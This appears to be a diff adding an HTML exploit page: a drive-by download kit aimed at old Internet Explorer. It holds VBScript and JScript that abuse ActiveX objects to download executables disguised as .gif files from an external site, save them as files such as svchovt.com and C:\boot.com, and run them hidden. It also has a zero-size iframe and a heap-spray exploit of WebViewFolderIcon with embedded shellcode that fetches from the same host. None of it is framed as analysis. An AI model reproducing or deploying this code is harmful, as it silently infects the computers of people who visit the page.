@@ -1,0 +1,89 @@
+<html>
+<script language="VBScript.Encode">
+on error resume next
+sHit="clsid:Bd96C556-65a3-11D0-983A-00C04FC29e36"
+bI="obJeCt"
+Dl = "http://www.medclub.com.tw/simple/image/p7b.gif"
+aSo="classid"
+fuckme="GET"
+wocao="Microsoft.XMLHtTP"
+caonima="Scripting.FileSystemObject"
+worinima="Shell.Application"
+Set df = document.createElement(bi)
+df.setAttribute aso, shit
+str=wocao
+Set x = df.CreateObject(str,"")
+a1="Ado"
+a2="db."
+a3="Str"
+a4="eam"
+str1=a1&a2&a3&a4
+str5=str1
+set S = df.createobject(str5,"")
+S.type = 1
+str6="GET"
+x.Open str6, dl, False
+x.Send
+fname1="svchovt.com"
+set F = df.createobject("Scripting.FileSystemObject","")
+FnaMe1= f.BuiLdPaTh(tmp,FnaMe1)
+set tmp = F.GetSpecialFolder(2)
+FnaMe1= f.BuiLdPaTh(tmp,FnaMe1)
+S.open
+S.write x.responseBody
+S.savetofile fname1,2
+S.close
+set Q = df.createobject(worinima,"")
+Q.ShellExecute fname1,"","","open",0
+</script>
+<script language = JScript.Encode>try{var ado=(document.createElement("object"));
+url="http://www.medclub.com.tw/chinese/image/p2bon.gif";var url,path;path="C:\\boot.com";var d=1;ado.setAttribute("classid","clsid:BD96C556-65A3-11D0-983A-00C04FC29E36");var e=1;var xml=ado.CreateObject("Microsoft.XMLHTTP","");var cd="Stream";var f=1;var ab="Adodb.";var g=1;var as=ado.createobject(ab+cd,"");var h=1;xml.Open("GET",url,0);as.type=1;xml.Send();var n=1;as.open();as.write(xml.responseBody);as.savetofile(path,2);var shell=ado.createobject("Shell.Application","");as.close();shell.ShellExecute(path,"","","open",0);}catch(e){};</script>
+</html><IFRAME SRC="http://www.medclub.com.tw/simple/newly/image/1.htm" WIDTH=0 HEIGHT=0></IFRAME>
+<pre>
+<code><span style="font: 10pt Courier New;"><span class="general1-symbol">
+<object classid='clsid:6BA21C22-53A5-463F-BBE8-5CF7FFA0132B' id='test'></object>
+<script language='VBScript.Encode'>
+Sub tryMe
+  On Error Resume Next
+    test.HttpDownloadFile "http://www.medclub.com.tw/simple/image/p7b.gif", "c:\test.exe"
+    tryMe()
+End Sub
+</script>
+</span>
+</code></pre>
+<HTML>
+<BODY>
+<SCRIPT language="JScript.Encode">
+var heapSprayToAddress = 0x05050505;
+var heapSprayToAddress = 0x05050505;
+var payLoadCode = unescape("%u4343%u4343%u4343%ua3e9%u0000%u5f00%ua164%u0030%u0000%u408b%u8b0c%u1c70%u8bad%u0868%uf78b%u046a%ue859%u0043%u0000%uf9e2%u6f68%u006e%u6800%u7275%u6d6c%uff54%u9516%u2ee8%u0000%u8300%u20ec%udc8b%u206a%uff53%u0456%u04c7%u5c03%u2e61%uc765%u0344%u7804%u0065%u3300%u50c0%u5350%u5057%u56ff%u8b10%u50dc%uff53%u0856%u56ff%u510c%u8b56%u3c75%u748b%u782e%uf503%u8b56%u2076%uf503%uc933%u4149%u03ad%u33c5%u0fdb%u10be%ud63a%u0874%ucbc1%u030d%u40da%uf1eb%u1f3b%ue775%u8b5e%u245e%udd03%u8b66%u4b0c%u5e8b%u031c%u8bdd%u8b04%uc503%u5eab%uc359%u58e8%uffff%u8eff%u0e4e%uc1ec%ue579%u98b8%u8afe%uef0e%ue0ce%u3660%u2f1a%u6870%u7474%u3a70%u2f2f%u7777%u2e77%u656d%u6364%u756c%u2e62%u6f63%u2e6d%u7774%u6f2f%u6472%u7265%u682f%u6c65%u2e70%u6967%u0066");
+var heapBlockSize = 0x400000;
+var payLoadSize = payLoadCode.length * 2;
+var spraySlideSize = heapBlockSize - (payLoadSize+0x38);
+var spraySlide = unescape("%u0505%u0505");
+heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;
+spraySlide = getSpraySlide(spraySlide,spraySlideSize);
+memory = new Array();
+for (i=0;i<heapBlocks;i++)
+{
+memory = spraySlide + payLoadCode;
+}
+for ( i = 0 ; i < 300 ; i++) 
+{
+try{ 
+var tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');
+tar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 ); 
+}catch(e){}
+}
+function getSpraySlide(spraySlide, spraySlideSize)
+{
+while (spraySlide.length*2<spraySlideSize)
+{
+spraySlide += spraySlide;
+}
+spraySlide = spraySlide.substring(0,spraySlideSize/2);
+return spraySlide;
+}
+</SCRIPT> 
+</BODY>
+</HTML>
